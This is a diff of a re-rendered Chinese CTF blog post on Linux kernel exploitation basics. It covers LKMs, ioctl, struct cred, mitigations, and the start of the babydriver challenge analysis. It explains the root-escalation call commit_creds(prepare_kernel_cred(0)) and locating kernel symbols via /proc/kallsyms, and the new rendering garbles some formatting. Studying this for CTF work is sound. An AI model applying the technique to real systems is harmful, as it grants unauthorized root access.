@@ -32,7 +32,7 @@
 
 
 
-<meta name="generator" content="Hugo 0.55.2" />
+<meta name="generator" content="Hugo 0.75.1" />
 
 
 <link rel="canonical" href="https://bash-c.github.io/post/linux-kernel-pwn-abc-1/" />
@@ -61,16 +61,13 @@
 <meta property="og:description" content="记录一下最近学到的 linux kernel pwn 知识，第一篇主要是一些基础知识和简单漏洞利用，比较基础。" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://bash-c.github.io/post/linux-kernel-pwn-abc-1/" />
-<meta property="article:published_time" content="2018-10-03T19:50:41&#43;08:00"/>
-<meta property="article:modified_time" content="2018-10-03T19:50:41&#43;08:00"/>
-
+<meta property="article:published_time" content="2018-10-03T19:50:41+08:00" />
+<meta property="article:modified_time" content="2018-10-03T19:50:41+08:00" />
 <meta itemprop="name" content="Linux Kernel Pwn ABC(Ⅰ)">
 <meta itemprop="description" content="记录一下最近学到的 linux kernel pwn 知识，第一篇主要是一些基础知识和简单漏洞利用，比较基础。">
-
-
-<meta itemprop="datePublished" content="2018-10-03T19:50:41&#43;08:00" />
-<meta itemprop="dateModified" content="2018-10-03T19:50:41&#43;08:00" />
-<meta itemprop="wordCount" content="12041">
+<meta itemprop="datePublished" content="2018-10-03T19:50:41+08:00" />
+<meta itemprop="dateModified" content="2018-10-03T19:50:41+08:00" />
+<meta itemprop="wordCount" content="12045">
 
 
 
@@ -318,7 +315,7 @@
             <a href="https://bash-c.github.io/categories/writeup/"> writeup </a>
             
           </div>
-        <span class="more-meta"> 12041 words </span>
+        <span class="more-meta"> 12045 words </span>
           <span class="more-meta"> 25 min read </span>
 
         
@@ -339,49 +336,29 @@
   <h2 class="post-toc-title">Table of Contents</h2>
   <div class="post-toc-content">
     <nav id="TableOfContents">
-<ul>
-<li>
-<ul>
-<li><a href="#basic-knowledge">Basic Knowledge</a>
-<ul>
-<li><a href="#kernel">Kernel</a></li>
-<li><a href="#ring-model">Ring Model</a></li>
-<li><a href="#loadable-kernel-modules-lkms">Loadable Kernel Modules(LKMs)</a>
-<ul>
-<li><a href="#相关指令">相关指令</a></li>
-</ul></li>
-<li><a href="#syscall">syscall</a></li>
-<li><a href="#ioctl">ioctl</a></li>
-<li><a href="#状态切换">状态切换</a>
-<ul>
-<li><a href="#user-space-to-kernel-space">user space to kernel space</a></li>
-<li><a href="#kernel-space-to-user-space">kernel space to user space</a></li>
-</ul></li>
-<li><a href="#struct-cred">struct cred</a></li>
-<li><a href="#内核态函数">内核态函数</a></li>
-<li><a href="#mitigation">Mitigation</a></li>
-<li><a href="#ctf-kernel-pwn-相关">CTF kernel pwn 相关</a></li>
-</ul></li>
-<li><a href="#example">Example</a>
-<ul>
-<li><a href="#kernel-uaf-ciscn2017-babydriver">kernel UAF - CISCN2017 - babydriver</a>
-<ul>
-<li><a href="#分析">分析</a></li>
-<li><a href="#思路">思路</a></li>
-<li><a href="#exploit">Exploit</a></li>
-<li><a href="#get-root-shell">get root shell</a></li>
-</ul></li>
-<li><a href="#kernel-rop-2018强网杯-core">kernel ROP - 2018强网杯 - core</a>
-<ul>
-<li><a href="#分析-1">分析</a></li>
-<li><a href="#思路-1">思路</a></li>
-<li><a href="#exploit-1">Exploit</a></li>
-<li><a href="#get-root-shell-1">get root shell</a></li>
-</ul></li>
-</ul></li>
-<li><a href="#reference-and-thanks-to">Reference and Thanks to</a></li>
-</ul></li>
-</ul>
+  <ul>
+    <li><a href="#basic-knowledge">Basic Knowledge</a>
+      <ul>
+        <li><a href="#kernel">Kernel</a></li>
+        <li><a href="#ring-model">Ring Model</a></li>
+        <li><a href="#loadable-kernel-moduleslkms">Loadable Kernel Modules(LKMs)</a></li>
+        <li><a href="#syscall">syscall</a></li>
+        <li><a href="#ioctl">ioctl</a></li>
+        <li><a href="#状态切换">状态切换</a></li>
+        <li><a href="#struct-cred">struct cred</a></li>
+        <li><a href="#内核态函数">内核态函数</a></li>
+        <li><a href="#mitigation">Mitigation</a></li>
+        <li><a href="#ctf-kernel-pwn-相关">CTF kernel pwn 相关</a></li>
+      </ul>
+    </li>
+    <li><a href="#example">Example</a>
+      <ul>
+        <li><a href="#kernel-uaf---ciscn2017---babydriver">kernel UAF - CISCN2017 - babydriver</a></li>
+        <li><a href="#kernel-rop---2018强网杯---core">kernel ROP - 2018强网杯 - core</a></li>
+      </ul>
+    </li>
+    <li><a href="#reference-and-thanks-to">Reference and Thanks to</a></li>
+  </ul>
 </nav>
   </div>
 </div>
@@ -389,92 +366,61 @@
     
     <div class="post-content">
       <p>记录一下最近学到的 linux kernel pwn 知识，第一篇主要是一些基础知识和简单漏洞利用，比较基础。</p>
-
 <h2 id="basic-knowledge">Basic Knowledge</h2>
-
 <p>主要参考了 <a href="https://github.com/bash-c/slides/blob/master/pwn_kernel/13_lecture.pdf">Linux Kernel Exploitation</a>，另外强力建议阅读 <a href="http://mp.weixin.qq.com/mp/homepage?__biz=MzI3NzA5MzUxNA==&amp;hid=2&amp;sn=73cb26dd403cac563c9d661a8126c035&amp;scene=18#wechat_redirect">内核模块编程入门</a>。</p>
-
 <h3 id="kernel">Kernel</h3>
-
 <p>kernel 也是一个程序，用来管理软件发出的数据 I/O 要求，讲这些要求转义为指令，交给 CPU 和计算机中的其他组件处理，kernel 是现代操作系统最基本的部分。</p>
-
-<p><img src="https://upload.wikimedia.org/wikipedia/commons/8/8f/Kernel_Layout.svg" alt="" /></p>
-
+<p><img src="https://upload.wikimedia.org/wikipedia/commons/8/8f/Kernel_Layout.svg" alt=""></p>
 <p>kernel 最主要的功能有两点：</p>
-
 <ol>
 <li>控制并与硬件进行交互</li>
 <li>提供 application 能运行的环境</li>
 </ol>
-
 <p>包括 I/O，权限控制，系统调用，进程管理，内存管理等多项功能都可以归结到上边两点中。</p>
-
 <p>需要注意的是，<strong>kernel 的 crash 通常会引起重启</strong>。</p>
-
 <h3 id="ring-model">Ring Model</h3>
-
 <p>intel CPU 将 CPU 的特权级别分为 4 个级别：Ring 0, Ring 1, Ring 2, Ring 3。</p>
-
 <p>Ring0 只给 OS 使用，Ring 3 所有程序都可以使用，内层 Ring 可以随便使用外层 Ring 的资源。</p>
-
 <p>使用 Ring Model 是为了提升系统安全性，例如某个间谍软件作为一个在 Ring 3 运行的用户程序，在不通知用户的时候打开摄像头会被阻止，因为访问硬件需要使用being驱动程序保留的 Ring 1 的方法。</p>
-
 <p>大多数的现代操作系统只使用了 Ring 0 和 Ring 3。
-<img src="http://ww1.sinaimg.cn/large/006AWYXBly1fvvb8k44kjj30rf0j2wke.jpg" alt="" /></p>
-
-<h3 id="loadable-kernel-modules-lkms">Loadable Kernel Modules(LKMs)</h3>
-
+<img src="http://ww1.sinaimg.cn/large/006AWYXBly1fvvb8k44kjj30rf0j2wke.jpg" alt=""></p>
+<h3 id="loadable-kernel-moduleslkms">Loadable Kernel Modules(LKMs)</h3>
 <p>可加载核心模块 (或直接称为内核模块) 就像运行在内核空间的可执行程序，包括:</p>
-
 <ul>
 <li>驱动程序（Device drivers）</li>
 <li>内核扩展模块 (modules)</li>
 </ul>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fvw9qhknaoj30ps0hkaev.jpg" alt="" /></p>
-
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fvw9qhknaoj30ps0hkaev.jpg" alt=""></p>
 <p>LKMs 的文件格式和用户态的可执行程序相同，Linux 下为 ELF，Windows 下为 exe/dll，mac 下为 MACH-O，因此我们可以用 IDA 等工具来分析内核模块。</p>
-
 <p>模块可以被单独编译，但不能单独运行。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户控件的进程不同。</p>
-
 <p>模块通常用来实现一种文件系统、一个驱动程序或者其他内核上层的功能。</p>
-
 <blockquote>
 <p>Linux 内核之所以提供模块机制，是因为它本身是一个单内核 (monolithic kernel)。单内核的优点是效率高，因为所有的内容都集合在一起，但缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。</p>
 </blockquote>
-
 <h4 id="相关指令">相关指令</h4>
-
 <ul>
 <li><strong>insmod</strong>: 讲指定模块加载到内核中</li>
 <li><strong>rmmod</strong>: 从内核中卸载指定模块</li>
 <li><strong>lsmod</strong>: 列出已经加载的模块</li>
 </ul>
-
 <blockquote>
 <p>大多数　kernel vulnerability 也出在 LKM 中。</p>
 </blockquote>
-
 <h3 id="syscall">syscall</h3>
-
 <p>系统调用，指的是用户空间的程序向操作系统内核请求需要更高权限的服务，比如 IO 操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数（如 scanf，puts 等 IO 相关的函数实际上是对系统调用的封装 （read 和 write)）。</p>
-
 <blockquote>
 <p>在 <em>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</em> 和 <em>/usr/include/x86_64-linux-gnu/asm/unistd_32.h</em> 分别可以查看 64 位和 32 位的系统调用号。</p>
-
+</blockquote>
+<blockquote>
 <p>推荐两个查阅系统调用号的网站</p>
-
 <p><a href="https://syscalls32.paolostivanin.com">syscall-32</a></p>
-
 <p><a href="https://syscalls64.paolostivanin.com">syscall-64</a></p>
 </blockquote>
-
 <h3 id="ioctl">ioctl</h3>
-
 <p>直接查看 man 手册</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -495,9 +441,9 @@
 </span><span class="lnt">19
 </span><span class="lnt">20
 </span><span class="lnt">21
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">NAME
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">NAME
        ioctl - control device
 
 SYNOPSIS
@@ -517,37 +463,38 @@ DESCRIPTION
 
        An ioctl() request has encoded in it whether the argument is an in parameter or
        out  parameter, and the size of the argument argp in bytes.  Macros and defines
-       used in specifying an ioctl() request are located in the file &lt;sys/ioctl.h&gt;.</pre></td></tr></table>
+       used in specifying an ioctl() request are located in the file &lt;sys/ioctl.h&gt;.
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>可以看出 ioctl 也是一个系统调用，用于与设备通信。</p>
-
+</div><p>可以看出 ioctl 也是一个系统调用，用于与设备通信。</p>
 <p><code>int ioctl(int fd, unsigned long request, ...)</code> 的第一个参数为打开设备 (open) 返回的 <a href="http://m4x.fun/post/play-with-file-descriptor-1/">文件描述符</a>，第二个参数为用户程序对设备的控制命令，再后边的参数则是一些补充参数，与设备有关。</p>
-
 <blockquote>
 <p>使用 ioctl 进行通信的原因：</p>
-
+</blockquote>
+<blockquote>
 <p>操作系统提供了内核访问标准外部设备的系统调用，因为大多数硬件设备只能够在内核空间内直接寻址,但是当访问非标准硬件设备这些系统调用显得不合适,有时候用户模式可能需要直接访问设备。</p>
-
+</blockquote>
+<blockquote>
 <p>比如，一个系统管理员可能要修改网卡的配置。现代操作系统提供了各种各样设备的支持，有一些设备可能没有被内核设计者考虑到，如此一来提供一个这样的系统调用来使用设备就变得不可能了。</p>
-
+</blockquote>
+<blockquote>
 <p>为了解决这个问题，内核被设计成可扩展的，可以加入一个称为设备驱动的模块，驱动的代码允许在内核空间运行而且可以对设备直接寻址。一个Ioctl接口是一个独立的系统调用，通过它用户空间可以跟设备驱动沟通。对设备驱动的请求是一个以设备和请求号码为参数的Ioctl调用，如此内核就允许用户空间访问设备驱动进而访问设备而不需要了解具体的设备细节，同时也不需要一大堆针对不同设备的系统调用。</p>
 </blockquote>
-
 <h3 id="状态切换">状态切换</h3>
-
 <h4 id="user-space-to-kernel-space">user space to kernel space</h4>
-
 <p>当发生 <code>系统调用</code>，<code>产生异常</code>，<code>外设产生中断</code>等事件时，会发生用户态到内核态的切换，具体的过程为：</p>
-
 <ol>
-<li>通过 <code>swapgs</code> 切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。</li>
-<li>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp/esp。</li>
-
-<li><p>通过 push 保存各寄存器值，具体的 <a href="http://elixir.free-electrons.com/linux/v4.12/source/arch/x86/entry/entry_64.S">代码</a> 如下:</p>
+<li>
+<p>通过 <code>swapgs</code> 切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。</p>
+</li>
+<li>
+<p>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp/esp。</p>
+</li>
+<li>
+<p>通过 push 保存各寄存器值，具体的 <a href="http://elixir.free-electrons.com/linux/v4.12/source/arch/x86/entry/entry_64.S">代码</a> 如下:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -579,12 +526,12 @@ DESCRIPTION
 <pre class="chroma"><code class="language-asm" data-lang="asm"> <span class="nf">ENTRY</span><span class="p">(</span><span class="no">entry_SYSCALL_64</span><span class="p">)</span>
  <span class="err">/*</span> <span class="nf">SWAPGS_UNSAFE_STACK是一个宏</span><span class="err">，</span><span class="no">x86直接定义为swapgs指令</span> <span class="p">*</span><span class="err">/</span>
  <span class="nf">SWAPGS_UNSAFE_STACK</span>
-    
+   
  <span class="err">/*</span> <span class="err">保存栈值，并设置内核栈</span> <span class="err">*/</span>
  <span class="nf">movq</span> <span class="nv">%rsp</span><span class="p">,</span> <span class="no">PER_CPU_VAR</span><span class="p">(</span><span class="no">rsp_scratch</span><span class="p">)</span>
  <span class="nf">movq</span> <span class="no">PER_CPU_VAR</span><span class="p">(</span><span class="no">cpu_current_top_of_stack</span><span class="p">),</span> <span class="nv">%rsp</span>
-    
-    
+   
+   
 <span class="err">/*</span> <span class="err">通过</span><span class="nf">push保存寄存器值</span><span class="err">，形成一个</span><span class="no">pt_regs结构</span> <span class="p">*</span><span class="err">/</span>
 <span class="err">/*</span> <span class="nf">Construct</span> <span class="no">struct</span> <span class="no">pt_regs</span> <span class="no">on</span> <span class="no">stack</span> <span class="p">*</span><span class="err">/</span>
 <span class="nf">pushq</span>  <span class="no">$__USER_DS</span>      <span class="err">/</span><span class="p">*</span> <span class="no">pt_regs-</span><span class="err">&gt;</span><span class="no">ss</span> <span class="p">*</span><span class="err">/</span>
@@ -602,32 +549,30 @@ DESCRIPTION
 <span class="nf">pushq</span>  <span class="nv">%r9</span>              <span class="err">/</span><span class="p">*</span> <span class="no">pt_regs-</span><span class="err">&gt;</span><span class="no">r9</span> <span class="p">*</span><span class="err">/</span>
 <span class="nf">pushq</span>  <span class="nv">%r10</span>             <span class="err">/</span><span class="p">*</span> <span class="no">pt_regs-</span><span class="err">&gt;</span><span class="no">r10</span> <span class="p">*</span><span class="err">/</span>
 <span class="nf">pushq</span>  <span class="nv">%r11</span>             <span class="err">/</span><span class="p">*</span> <span class="no">pt_regs-</span><span class="err">&gt;</span><span class="no">r11</span> <span class="p">*</span><span class="err">/</span>
-<span class="nf">sub</span> <span class="no">$</span><span class="p">(</span><span class="mi">6</span><span class="p">*</span><span class="mi">8</span><span class="p">),</span> <span class="nv">%rsp</span>      <span class="err">/</span><span class="p">*</span> <span class="no">pt_regs-</span><span class="err">&gt;</span><span class="no">bp</span><span class="p">,</span> <span class="no">bx</span><span class="p">,</span> <span class="no">r12-15</span> <span class="no">not</span> <span class="no">saved</span> <span class="p">*</span><span class="err">/</span></code></pre></td></tr></table>
+<span class="nf">sub</span> <span class="no">$</span><span class="p">(</span><span class="mi">6</span><span class="p">*</span><span class="mi">8</span><span class="p">),</span> <span class="nv">%rsp</span>      <span class="err">/</span><span class="p">*</span> <span class="no">pt_regs-</span><span class="err">&gt;</span><span class="no">bp</span><span class="p">,</span> <span class="no">bx</span><span class="p">,</span> <span class="no">r12-15</span> <span class="no">not</span> <span class="no">saved</span> <span class="p">*</span><span class="err">/</span>
+</code></pre></td></tr></table>
 </div>
-</div></li>
-
-<li><p>通过汇编指令判断是否为 x32_abi。</p></li>
-
-<li><p>通过系统调用号，跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用。</p></li>
+</div><p>``</p>
+</li>
+<li>
+<p>通过汇编指令判断是否为 x32_abi。</p>
+</li>
+<li>
+<p>通过系统调用号，跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用。</p>
+</li>
 </ol>
-
 <h4 id="kernel-space-to-user-space">kernel space to user space</h4>
-
 <p>退出时，流程如下：</p>
-
 <ol>
 <li>通过 <code>swapgs</code> 恢复 GS 值</li>
 <li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）</li>
 </ol>
-
 <h3 id="struct-cred">struct cred</h3>
-
 <p>之前提到 kernel 记录了进程的权限，更具体的，是用 cred 结构体记录的，每个进程中都有一个 cred 结构，这个结构保存了该进程的权限等信息（uid，gid 等），如果能修改某个进程的 cred，那么也就修改了这个进程的权限。</p>
-
 <p><a href="https://code.woboq.org/linux/linux/include/linux/cred.h.html#cred">源码</a> 如下:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -706,38 +651,32 @@ DESCRIPTION
 </span><span class="c"></span>	<span class="no">struct</span> <span class="no">user_namespace</span> <span class="p">*</span><span class="no">user_ns</span><span class="c">; /* user_ns the caps and keyrings are relative to. */
 </span><span class="c"></span>	<span class="no">struct</span> <span class="no">group_info</span> <span class="p">*</span><span class="no">group_info</span><span class="c">;	/* supplementary groups for euid/fsgid */
 </span><span class="c"></span>	<span class="no">struct</span> <span class="no">rcu_head</span>	<span class="no">rcu</span><span class="c">;		/* RCU deletion hook */
-</span><span class="c"></span><span class="err">}</span> <span class="no">__randomize_layout</span><span class="err">;</span></code></pre></td></tr></table>
+</span><span class="c"></span><span class="err">}</span> <span class="no">__randomize_layout</span><span class="c">;
+</span></code></pre></td></tr></table>
 </div>
-</div>
-<h3 id="内核态函数">内核态函数</h3>
-
+</div><h3 id="内核态函数">内核态函数</h3>
 <p>相比用户态库函数，内核态的函数有了一些变化</p>
-
 <ul>
-<li>printf()      -&gt;      <strong>printk()</strong>，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 <code>dmesg</code> 查看效果</li>
-<li>memcpy()      -&gt;      <strong>copy_from_user()/copy_to_user()</strong>
-
+<li>printf()		-&gt;		<strong>printk()</strong>，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 <code>dmesg</code> 查看效果</li>
+<li>memcpy()		-&gt;		<strong>copy_from_user()/copy_to_user()</strong>
 <ul>
 <li>copy_from_user() 实现了将用户空间的数据传送到内核空间</li>
 <li>copy_to_user() 实现了将内核空间的数据传送到用户空间</li>
-</ul></li>
-<li>malloc()      -&gt;      <strong>kmalloc()</strong>，内核态的内存分配函数，和 malloc() 相似，但使用的是 <code>slab/slub 分配器</code></li>
-<li>free()        -&gt;      <strong>kfree()</strong>，同 kmalloc()</li>
 </ul>
-
+</li>
+<li>malloc()		-&gt;		<strong>kmalloc()</strong>，内核态的内存分配函数，和 malloc() 相似，但使用的是 <code>slab/slub 分配器</code></li>
+<li>free()		-&gt;		<strong>kfree()</strong>，同 kmalloc()</li>
+</ul>
 <p>另外要注意的是，<code>kernel 管理进程，因此 kernel 也记录了进程的权限</code>。kernel 中有两个可以方便的改变权限的函数：</p>
-
 <ul>
-<li><strong>int commit_creds(struct cred *new)</strong></li>
-<li><strong>struct cred* prepare_kernel_cred(struct task_struct* daemon)</strong></li>
+<li>*<em>int commit_creds(struct cred <em>new)</em></em></li>
+<li><em><em>struct cred</em> prepare_kernel_cred(struct task_struct</em> daemon)**</li>
 </ul>
-
 <p>从函数名也可以看出，执行 <code>commit_creds(prepare_kernel_cred(0))</code> 即可获得 root 权限（root 的 uid，gid 均为 0）</p>
-
 <p>执行 <code>commit_creds(prepare_kernel_cred(0))</code> 也是最常用的提权手段，两个函数的地址都可以在 <code>/proc/kallsyms</code> 中查看（较老的内核版本中是 <code>/proc/ksyms</code>。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -756,41 +695,42 @@ ffffffffbc7f06fe r __kstrtab_commit_creds
 post sudo grep prepare_kernel_cred /proc/kallsyms
 ffffffffbb6afd90 T prepare_kernel_cred
 ffffffffbc7d4f20 r __ksymtab_prepare_kernel_cred
-ffffffffbc7f06b7 r __kstrtab_prepare_kernel_cred</code></pre></td></tr></table>
+ffffffffbc7f06b7 r __kstrtab_prepare_kernel_cred
+</code></pre></td></tr></table>
 </div>
-</div>
-<blockquote>
+</div><blockquote>
 <p>一般情况下，/proc/kallsyms 的内容需要 root 权限才能查看</p>
 </blockquote>
-
 <h3 id="mitigation">Mitigation</h3>
-
 <blockquote>
 <p>canary, dep, PIE, RELRO 等保护与用户态原理和作用相同</p>
 </blockquote>
-
 <ul>
-<li><p>smep: Supervisor Mode Execution Protection，当处理器处于 <code>ring0</code> 模式时，执行 <code>用户空间</code> 的代码会触发页错误。（在 arm 中该保护称为 <code>PXN</code>)</p></li>
-
-<li><p>smap: Superivisor Mode Access Protection，类似于 smep，通常是在访问数据时。</p></li>
-
-<li><p>mmap_min_addr:</p></li>
+<li>
+<p>smep: Supervisor Mode Execution Protection，当处理器处于 <code>ring0</code> 模式时，执行 <code>用户空间</code> 的代码会触发页错误。（在 arm 中该保护称为 <code>PXN</code>)</p>
+</li>
+<li>
+<p>smap: Superivisor Mode Access Protection，类似于 smep，通常是在访问数据时。</p>
+</li>
+<li>
+<p>mmap_min_addr:</p>
+</li>
 </ul>
-
 <h3 id="ctf-kernel-pwn-相关">CTF kernel pwn 相关</h3>
-
 <p>一般会给以下三个文件</p>
-
 <ol>
-<li>boot.sh: 一个用于启动 kernel 的 shell 的脚本，多用 qemu，保护措施与 qemu 不同的启动参数有关</li>
-<li>bzImage: kernel binary</li>
-
-<li><p>rootfs.cpio: 文件系统映像</p>
-
+<li>
+<p>boot.sh: 一个用于启动 kernel 的 shell 的脚本，多用 qemu，保护措施与 qemu 不同的启动参数有关</p>
+</li>
+<li>
+<p>bzImage: kernel binary</p>
+</li>
+<li>
+<p>rootfs.cpio: 文件系统映像</p>
 <p>比如：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -825,52 +765,46 @@ rootfs.cpio
 CISCN2017_babydriver <span class="o">[</span>master●<span class="o">]</span> ls
 babydriver.tar  boot.sh  bzImage  rootfs.cpio
 CISCN2017_babydriver <span class="o">[</span>master●<span class="o">]</span> file bzImage
-bzImage: Linux kernel x86 boot executable bzImage, version <span class="m">4</span>.4.72 <span class="o">(</span>atum@ubuntu<span class="o">)</span> <span class="c1">#1 SMP Thu Jun 15 19:52:50 PDT 2017, RO-rootFS, swap_dev 0x6, Normal VGA</span>
+bzImage: Linux kernel x86 boot executable bzImage, version 4.4.72 <span class="o">(</span>atum@ubuntu<span class="o">)</span> <span class="c1">#1 SMP Thu Jun 15 19:52:50 PDT 2017, RO-rootFS, swap_dev 0x6, Normal VGA</span>
 CISCN2017_babydriver <span class="o">[</span>master●<span class="o">]</span> file rootfs.cpio
-rootfs.cpio: gzip compressed data, last modified: Tue Jul  <span class="m">4</span> <span class="m">08</span>:39:15 <span class="m">2017</span>, max compression, from Unix, original size <span class="m">2844672</span>
+rootfs.cpio: gzip compressed data, last modified: Tue Jul  <span class="m">4</span> 08:39:15 2017, max compression, from Unix, original size <span class="m">2844672</span>
 CISCN2017_babydriver <span class="o">[</span>master●<span class="o">]</span> file boot.sh
 boot.sh: Bourne-Again shell script, ASCII text executable
 CISCN2017_babydriver <span class="o">[</span>master●<span class="o">]</span> bat boot.sh 
 ───────┬─────────────────────────────────────────────────────────────────────────────────
        │ File: boot.sh
 ───────┼─────────────────────────────────────────────────────────────────────────────────
-   <span class="m">1</span>   │ <span class="cp">#!/bin/bash
-</span><span class="cp"></span>   <span class="m">2</span>   │ 
+   <span class="m">1</span>   │ <span class="c1">#!/bin/bash</span>
+   <span class="m">2</span>   │ 
    <span class="m">3</span>   │ qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append <span class="s1">&#39;console=ttyS0 ro
 </span><span class="s1">       │ ot=/dev/ram oops=panic panic=1&#39;</span> -enable-kvm -monitor /dev/null -m 64M --nographi
-       │ c  -smp <span class="nv">cores</span><span class="o">=</span><span class="m">1</span>,threads<span class="o">=</span><span class="m">1</span> -cpu kvm64,+smep
-───────┴─────────────────────────────────────────────────────────────────────────────────</code></pre></td></tr></table>
+       │ c  -smp <span class="nv">cores</span><span class="o">=</span>1,threads<span class="o">=</span><span class="m">1</span> -cpu kvm64,+smep
+───────┴─────────────────────────────────────────────────────────────────────────────────
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>解释一下 qemu 启动的参数：</p>
-
+</div><p>``
+解释一下 qemu 启动的参数：</p>
 <ul>
 <li>-initrd rootfs.cpio，使用 rootfs.cpio 作为内核启动的文件系统</li>
 <li>-kernel bzImage，使用 bzImage 作为 kernel 映像</li>
 <li>-cpu kvm64,+smep，设置 CPU 的安全选项，这里开启了 smep</li>
-<li>-m 64M，设置虚拟 RAM 为 64M，默认为 128M
-<br /></li>
+<li>-m 64M，设置虚拟 RAM 为 64M，默认为 128M</li>
 </ul>
-
-<p>其他的选项可以通过 &ndash;help 查看。</p></li>
-
-<li><p>本地写好 exploit 后，可以通过 base64 编码等方式把编译好的二进制文件保存到远程目录下，进而拿到 flag</p></li>
+<p>其他的选项可以通过 &ndash;help 查看。</p>
+</li>
+<li>
+<p>本地写好 exploit 后，可以通过 base64 编码等方式把编译好的二进制文件保存到远程目录下，进而拿到 flag</p>
+</li>
 </ol>
-
 <h2 id="example">Example</h2>
-
 <p>背景知识还有很多，会在分析例题的过程中逐步介绍。</p>
-
-<h3 id="kernel-uaf-ciscn2017-babydriver">kernel UAF - CISCN2017 - babydriver</h3>
-
+<h3 id="kernel-uaf---ciscn2017---babydriver">kernel UAF - CISCN2017 - babydriver</h3>
 <p><a href="https://github.com/bash-c/pwn_repo/blob/master/CISCN2017_babydriver/babydriver.tar">attachment here</a></p>
-
 <h4 id="分析">分析</h4>
-
 <p>先解压 rootfs.cpio 看一下有什么文件</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -947,16 +881,16 @@ core <span class="o">[</span>master●<span class="o">]</span> bat init
 ───────┬─────────────────────────────────────────────────────────────────────────────────
        │ File: init
 ───────┼─────────────────────────────────────────────────────────────────────────────────
-   <span class="m">1</span>   │ <span class="cp">#!/bin/sh
-</span><span class="cp"></span>   <span class="m">2</span>   │
+   <span class="m">1</span>   │ <span class="c1">#!/bin/sh</span>
+   <span class="m">2</span>   │
    <span class="m">3</span>   │ mount -t proc none /proc
    <span class="m">4</span>   │ mount -t sysfs none /sys
    <span class="m">5</span>   │ mount -t devtmpfs devtmpfs /dev
    <span class="m">6</span>   │ chown root:root flag
    <span class="m">7</span>   │ chmod <span class="m">400</span> flag
-   <span class="m">8</span>   │ <span class="nb">exec</span> <span class="m">0</span>&lt;/dev/console
-   <span class="m">9</span>   │ <span class="nb">exec</span> <span class="m">1</span>&gt;/dev/console
-  <span class="m">10</span>   │ <span class="nb">exec</span> <span class="m">2</span>&gt;/dev/console
+   <span class="m">8</span>   │ <span class="nb">exec</span> 0&lt;/dev/console
+   <span class="m">9</span>   │ <span class="nb">exec</span> 1&gt;/dev/console
+  <span class="m">10</span>   │ <span class="nb">exec</span> 2&gt;/dev/console
   <span class="m">11</span>   │
   <span class="m">12</span>   │ insmod /lib/modules/4.4.72/babydriver.ko
   <span class="m">13</span>   │ chmod <span class="m">777</span> /dev/babydev
@@ -967,15 +901,14 @@ core <span class="o">[</span>master●<span class="o">]</span> bat init
   <span class="m">18</span>   │ umount /sys
   <span class="m">19</span>   │ poweroff -d <span class="m">0</span>  -f
   <span class="m">20</span>   │
-───────┴────────────────────────────────────────────────────────────</code></pre></td></tr></table>
+───────┴────────────────────────────────────────────────────────────
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>根据 init 的内容，12 行加载了 <code>babydriver.ko</code> 这个驱动，根据 pwn 的一般套路，这个就是有漏洞的 LKM 了。init 的其他命令都是 linux 常用的命令，就不再解释了。</p>
-
+</div><p>根据 init 的内容，12 行加载了 <code>babydriver.ko</code> 这个驱动，根据 pwn 的一般套路，这个就是有漏洞的 LKM 了。init 的其他命令都是 linux 常用的命令，就不再解释了。</p>
